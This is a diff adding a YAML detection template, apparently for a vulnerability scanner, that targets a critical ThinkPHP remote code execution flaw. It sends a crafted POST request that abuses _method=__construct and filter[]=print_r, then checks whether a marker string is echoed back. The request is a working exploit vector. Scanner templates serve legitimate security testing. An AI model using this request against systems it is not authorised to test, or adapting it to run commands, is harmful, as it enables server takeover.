@@ -1,0 +1,19 @@
+id: poc-yaml-thinkphp-index-construct-rce
+info:
+  name: ThinkPHP index.php 远程代码执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: ThinkPHP
+  osprey-id: vb_2019_0071
+requests:
+- method: POST
+  path: /index.php?s=index/index/index
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: s=4e5e5d7364f443e28fbf0d3ae744a59a&_method=__construct&method&filter[]=print_r
+  expression: 'contains(body, "4e5e5d7364f443e28fbf0d3ae744a59a__constructprint_r4e5e5d7364f443e28fbf0d3ae744a59a__constructprint_r")
+
+    '
+variables: {}
+transport: http
